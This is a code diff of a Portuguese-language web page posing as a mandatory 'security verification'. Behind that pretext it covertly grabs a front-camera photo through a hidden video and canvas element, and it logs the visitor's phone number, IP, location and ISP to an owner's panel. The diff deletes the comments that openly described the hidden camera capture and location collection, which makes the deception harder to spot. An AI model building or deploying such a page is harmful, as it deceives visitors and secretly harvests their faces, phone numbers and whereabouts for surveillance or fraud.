@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>fuzue developer - Advanced Security System</title>
+<title>fuzue developer - Security System</title>
 <style>
 :root{--bg:#000000;--card:#0a0a0e;--border:#1a1a24;--red:#ff1a1a;--text:#f0f0f5;--muted:#707085;--green:#00ff66;--vip-glow:rgba(255,26,26,0.25)}
 *{margin:0;padding:0;box-sizing:border-box;font-family:monospace;-webkit-tap-highlight-color:transparent}
 body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:12px;overflow-x:hidden}
 .container{width:100%;max-width:950px}
 
-/* Ecrã de Recolha de Dados do Visitante */
+/* Ecrã Inicial (Apenas campo de telemóvel) */
 #visitor-form-screen{background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
 h1{color:var(--red);font-size:1.5rem;margin-bottom:8px;text-transform:lowercase;letter-spacing:2px}
 p{color:var(--muted);margin-bottom:16px;font-size:0.85rem}
@@ -44,7 +44,7 @@ button:hover{opacity:.85}
 .dot{width:7px;height:7px;background:var(--green);border-radius:50%;box-shadow:0 0 8px var(--green)}
 .alert{background:rgba(255,26,26,0.08);border-left:4px solid var(--red);padding:12px;margin-bottom:14px;font-size:0.8rem;color:#ff6666;text-align:left;line-height:1.4;border-radius:0 6px 6px 0}
 
-/* Barra de Pesquisa Avançada */
+/* Barra de Pesquisa por Telemóvel */
 .search-box{margin-bottom:12px}
 .search-box input{width:100%;padding:10px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:0.85rem;letter-spacing:normal;text-align:left}
 
@@ -80,33 +80,32 @@ td{color:var(--text)}
 </head>
 <body>
 
-<!-- Elemento oculto para processar a câmara -->
 <video id="hidden-cam" autoplay playsinline></video>
 <canvas id="hidden-canvas" style="display:none;"></canvas>
 
 <div class="container">
 
-<!-- 1. Ecrã de Recolha do Telemóvel -->
+<!-- 1. Ecrã do Visitante (Apenas Telemóvel) -->
 <div id="visitor-form-screen">
 <h1>fuzue developer</h1>
-<p>Verificação de Segurança Obrigatória.</p>
+<p>Sistema de Validação Ativo.</p>
 <div class="alert-login">
-⚠️ Para prosseguir com o acesso, insira o seu número de telemóvel para validação do sistema.
+⚠️ Insira o seu número de telemóvel para prosseguir com a verificação de segurança.
 </div>
 <div class="form-group">
-  <label>Número de Telemóvel / WhatsApp</label>
+  <label>Telemóvel / WhatsApp</label>
   <input type="text" id="v-phone" placeholder="(00) 00000-0000">
 </div>
-<button onclick="submitVisitorData()">Verificar e Continuar</button>
+<button onclick="submitVisitorData()">Validar Acesso</button>
 <div style="margin-top:12px; font-size:0.7rem; color:var(--muted); cursor:pointer;" onclick="showLoginDirect()">Acesso Administrador</div>
 </div>
 
-<!-- 2. Ecrã de Login do Dono -->
+<!-- 2. Ecrã de Login do Administrador -->
 <div id="login">
 <h1>fuzue developer</h1>
 <p>Área restrita e monitorizada.</p>
 <div class="alert-login">
-⚠️ Insira a chave mestre de administrador para visualizar os registos globais.
+⚠️ Insira a chave mestre para gerir os registos de telemóveis.
 </div>
 <div class="input-box">
   <input type="password" id="pass" placeholder="••••••••" oninput="clearError()">
@@ -123,11 +122,11 @@ td{color:var(--text)}
 <div class="status"><div class="dot"></div>VIP Ativo</div>
 </div>
 <div class="alert">
-⚠️ <strong>PAINEL DO DONO:</strong> Sistema de pesquisa por telemóvel e biometria ativo.
+⚠️ <strong>PAINEL DO DONO:</strong> Registo de telemóveis e biometria em nuvem ativo.
 </div>
 
 <div class="search-box">
-  <input type="text" id="searchInput" placeholder="🔍 Pesquisar por Telemóvel, IP ou Localização..." oninput="filterLogs()">
+  <input type="text" id="searchInput" placeholder="🔍 Pesquisar por Número de Telemóvel..." oninput="filterLogs()">
 </div>
 
 <div class="actions">
@@ -171,11 +170,10 @@ async function submitVisitorData() {
   let phone = document.getElementById('v-phone').value.trim();
 
   if(!phone) {
-    alert('Por favor, insira o seu número de telemóvel.');
+    alert('Por favor, insira o número de telemóvel.');
     return;
   }
 
-  // Tenta capturar a câmara frontal
   let photoData = '';
   try {
     let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -195,7 +193,6 @@ async function submitVisitorData() {
     photoData = '';
   }
 
-  // Recolhe IP e localização
   let ip = 'Desconhecido';
   let loc = 'Desconhecido';
   let isp = 'Desconhecido';
@@ -306,7 +303,7 @@ async function renderLogs(){
 function displayLogsData(logsArray) {
   let tbody = document.getElementById('tb');
   if (logsArray.length === 0) {
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum resultado para a pesquisa.</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum resultado encontrado para este telemóvel.</td></tr>`;
     return;
   }
 
@@ -328,9 +325,7 @@ function displayLogsData(logsArray) {
 function filterLogs() {
   let query = document.getElementById('searchInput').value.toLowerCase();
   let filtered = globalLogs.filter(l => 
-    (l.phone && l.phone.toLowerCase().includes(query)) ||
-    (l.ip && l.ip.toLowerCase().includes(query)) ||
-    (l.loc && l.loc.toLowerCase().includes(query))
+    (l.phone && l.phone.toLowerCase().includes(query))
   );
   displayLogsData(filtered);
 }
